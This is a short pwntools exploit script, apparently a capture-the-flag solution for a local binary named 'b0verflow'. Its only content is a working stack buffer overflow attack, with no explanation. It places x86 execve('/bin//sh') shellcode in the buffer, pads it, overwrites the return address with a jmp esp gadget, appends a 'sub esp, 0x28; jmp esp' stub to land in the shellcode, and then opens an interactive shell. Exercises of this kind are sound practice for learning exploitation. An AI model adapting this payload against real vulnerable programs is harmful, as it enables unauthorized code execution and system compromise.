from pwn import * 

p=process('./b0verflow')

jmp_esp=0x08048504
shellcode=b'\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' 

payload=shellcode
payload=payload.ljust(0x20,b'A')
payload+=b'A'*4
payload+=p32(jmp_esp)
payload+=asm('sub esp, 0x28; jmp esp')

p.sendline(payload)
p.interactive()